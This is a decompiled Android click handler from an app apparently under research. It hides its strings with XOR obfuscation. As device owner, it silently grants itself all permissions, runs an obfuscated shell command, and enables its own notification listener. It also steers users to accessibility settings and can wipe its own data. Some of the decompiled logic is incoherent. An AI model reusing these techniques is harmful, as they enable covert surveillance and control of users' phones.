package e0;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences$Editor;
import android.content.pm.PackageManager$NameNotFoundException;
import android.os.Build$VERSION;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings$Secure;
import android.util.Log;
import android.view.View;
import android.view.View$OnClickListener;
import android.view.accessibility.AccessibilityManager;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.example.navistart.DPups;
import com.example.navistart.NLService;
import com.example.navistart.UpdateActivity;
import com.woha.appmanag.ManageAppsActivity;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import kotlin.io.encoding.Base64;
import kotlin.jvm.internal.ByteCompanionObject;

/* JADX INFO: compiled from: r8-map-id-94e2637d1b30c6542972a7fc4ced35aa6da258c4e6702fc7c9cbf0ebc32bec75 */
/* JADX INFO: loaded from: F:\omo\research\apk_contents\classes.dex */
public final /* synthetic */ class v2 implements View$OnClickListener {

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public final /* synthetic */ int f1978b;
    public final /* synthetic */ UpdateActivity c;

    /* JADX DEBUG: Don't trust debug lines info. Lines numbers was adjusted: min line is 1 */
    public /* synthetic */ v2(UpdateActivity updateActivity, int i9) {
        this.f1978b = i9;
        this.c = updateActivity;
    }

    /* JADX DEBUG: Don't trust debug lines info. Lines numbers was adjusted: min line is 1 */
    /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
    /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
    /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
    /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
    /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
    /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
    /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
    @Override // android.view.View$OnClickListener
    public final void onClick(View view) {
        String[] strArr;
        char c;
        Boolean bool;
        Iterator<AccessibilityServiceInfo> it;
        String string;
        ComponentName componentName;
        String strFlattenToString;
        int i9 = this.f1978b;
        UpdateActivity updateActivity = this.c;
        int i10 = 0;
        switch (i9) {
            case 0:
                String str = UpdateActivity.f871l;
                updateActivity.finish();
                break;
            case 1:
                String str2 = UpdateActivity.f871l;
                y5.k.u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                break;
            case 2:
                String str3 = UpdateActivity.f871l;
                if (!((DevicePolicyManager) updateActivity.getSystemService(m.h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                    Context applicationContext = updateActivity.getApplicationContext();
                    try {
                        strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                    } catch (PackageManager$NameNotFoundException e) {
                        e.printStackTrace();
                        strArr = new String[0];
                    }
                    if (strArr != null && strArr.length != 0) {
                        ArrayList arrayList = new ArrayList();
                        for (String str4 : strArr) {
                            if (ContextCompat.checkSelfPermission(applicationContext, str4) != 0) {
                                arrayList.add(str4);
                            }
                        }
                        if (!arrayList.isEmpty()) {
                            ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                        }
                    }
                    List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(m.h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                    Boolean bool2 = Boolean.FALSE;
                    Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                    while (it2.hasNext()) {
                        if (it2.next().getId().equals(updateActivity.getPackageName())) {
                            bool2 = Boolean.TRUE;
                        }
                    }
                    if (!bool2.booleanValue()) {
                        y5.k.u(updateActivity, new Intent(m.h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                    }
                    break;
                } else {
                    ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                    String strH = m.h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                    DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(m.h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                    try {
                        String packageName = updateActivity.getPackageName();
                        String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                        if (strArr2 != null) {
                            int length = strArr2.length;
                            c = 0;
                            while (i10 < length) {
                                try {
                                    devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i10], 1);
                                    i10++;
                                } catch (Exception e6) {
                                    e = e6;
                                    e.printStackTrace();
                                    List<AccessibilityServiceInfo> enabledAccessibilityServiceList2 = ((AccessibilityManager) updateActivity.getSystemService(m.h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                    bool = Boolean.FALSE;
                                    it = enabledAccessibilityServiceList2.iterator();
                                    while (it.hasNext()) {
                                        if (it.next().getId().equals(updateActivity.getPackageName())) {
                                            bool = Boolean.TRUE;
                                        }
                                    }
                                    if (!bool.booleanValue()) {
                                        y5.k.u(updateActivity, new Intent(m.h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                    }
                                    DevicePolicyManager devicePolicyManager2 = (DevicePolicyManager) updateActivity.getSystemService(m.h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                    new ComponentName(updateActivity, (Class<?>) DPups.class);
                                    devicePolicyManager2.isDeviceOwnerApp(updateActivity.getPackageName());
                                    Runtime.getRuntime().exec(m.h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                    string = Settings$Secure.getString(updateActivity.getContentResolver(), m.h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                    componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                    if (string == null) {
                                        if (string != null) {
                                            strFlattenToString = componentName.flattenToString();
                                        } else {
                                            strFlattenToString = componentName.flattenToString();
                                        }
                                        Settings$Secure.putString(updateActivity.getContentResolver(), m.h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                        Log.d(strH, m.h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                    } else {
                                        if (string != null) {
                                            strFlattenToString = componentName.flattenToString();
                                        } else {
                                            strFlattenToString = componentName.flattenToString();
                                        }
                                        Settings$Secure.putString(updateActivity.getContentResolver(), m.h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                        Log.d(strH, m.h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                    }
                                    if (ContextCompat.checkSelfPermission(updateActivity, m.h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                        ActivityCompat.requestPermissions(updateActivity, new String[]{m.h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                        return;
                                    } else if (Build$VERSION.SDK_INT < 29) {
                                        return;
                                    } else {
                                        return;
                                    }
                                }
                            }
                        } else {
                            c = 0;
                        }
                    } catch (Exception e9) {
                        e = e9;
                        c = 0;
                    }
                    List<AccessibilityServiceInfo> enabledAccessibilityServiceList3 = ((AccessibilityManager) updateActivity.getSystemService(m.h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                    bool = Boolean.FALSE;
                    it = enabledAccessibilityServiceList3.iterator();
                    while (it.hasNext()) {
                        if (it.next().getId().equals(updateActivity.getPackageName())) {
                            bool = Boolean.TRUE;
                        }
                    }
                    if (!bool.booleanValue()) {
                        y5.k.u(updateActivity, new Intent(m.h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                    }
                    DevicePolicyManager devicePolicyManager3 = (DevicePolicyManager) updateActivity.getSystemService(m.h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                    new ComponentName(updateActivity, (Class<?>) DPups.class);
                    devicePolicyManager3.isDeviceOwnerApp(updateActivity.getPackageName());
                    try {
                        Runtime.getRuntime().exec(m.h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                        break;
                    } catch (IOException unused) {
                    }
                    try {
                        string = Settings$Secure.getString(updateActivity.getContentResolver(), m.h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                        componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                        if (string == null && string.contains(componentName.flattenToString())) {
                            Log.d(strH, m.h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                        } else {
                            if (string != null || string.isEmpty()) {
                                strFlattenToString = componentName.flattenToString();
                            } else {
                                StringBuilder sb = new StringBuilder();
                                sb.append(string);
                                byte[] bArr = new byte[1];
                                bArr[c] = 55;
                                sb.append(m.h(bArr, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                sb.append(componentName.flattenToString());
                                strFlattenToString = sb.toString();
                            }
                            Settings$Secure.putString(updateActivity.getContentResolver(), m.h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                            Log.d(strH, m.h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                        }
                    } catch (Exception e10) {
                        Log.e(strH, m.h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e10.getMessage());
                    }
                }
                if (ContextCompat.checkSelfPermission(updateActivity, m.h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                    ActivityCompat.requestPermissions(updateActivity, new String[]{m.h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                } else if (Build$VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, m.h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                    ActivityCompat.requestPermissions(updateActivity, new String[]{m.h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                    break;
                }
                break;
            case 3:
                String str5 = UpdateActivity.f871l;
                h0.b.o().loadBoolean(m.h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                SharedPreferences$Editor sharedPreferences$EditorEdit = updateActivity.getSharedPreferences(u0.a.c, 0).edit();
                sharedPreferences$EditorEdit.clear();
                sharedPreferences$EditorEdit.apply();
                SharedPreferences$Editor sharedPreferences$EditorEdit2 = updateActivity.getSharedPreferences(o0.e.f4032b, 0).edit();
                sharedPreferences$EditorEdit2.clear();
                sharedPreferences$EditorEdit2.apply();
                File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                if (fileArrListFiles != null) {
                    for (File file : fileArrListFiles) {
                        file.delete();
                    }
                }
                File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                if (fileArrListFiles2 != null) {
                    int length2 = fileArrListFiles2.length;
                    while (i10 < length2) {
                        fileArrListFiles2[i10].delete();
                        i10++;
                    }
                }
                break;
            case 4:
                updateActivity.f875h.setEnabled(false);
                Handler handler = new Handler(Looper.getMainLooper());
                updateActivity.s(m.h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                for (int i11 = 1; i11 <= 4; i11++) {
                    handler.postDelayed(new a4.c(updateActivity, i11, 6), ((long) i11) * 2000);
                }
                handler.postDelayed(new w2(updateActivity, 0), 10000L);
                break;
            case 5:
                String str6 = UpdateActivity.f871l;
                updateActivity.finish();
                break;
            case 6:
                String str7 = UpdateActivity.f871l;
                l0.a.t(m0.s0.class, null).show(updateActivity.getSupportFragmentManager(), m.h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                break;
            case 7:
                String str8 = UpdateActivity.f871l;
                updateActivity.t();
                break;
            case 8:
                updateActivity.f877j++;
                Handler handler2 = updateActivity.f878k;
                handler2.removeCallbacksAndMessages(null);
                handler2.postDelayed(new w2(updateActivity, 1), 1000L);
                if (updateActivity.f877j >= 10) {
                    updateActivity.f877j = 0;
                    updateActivity.e.setVisibility(0);
                }
                break;
            default:
                String str9 = UpdateActivity.f871l;
                new y2(m.h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                break;
        }
    }
}
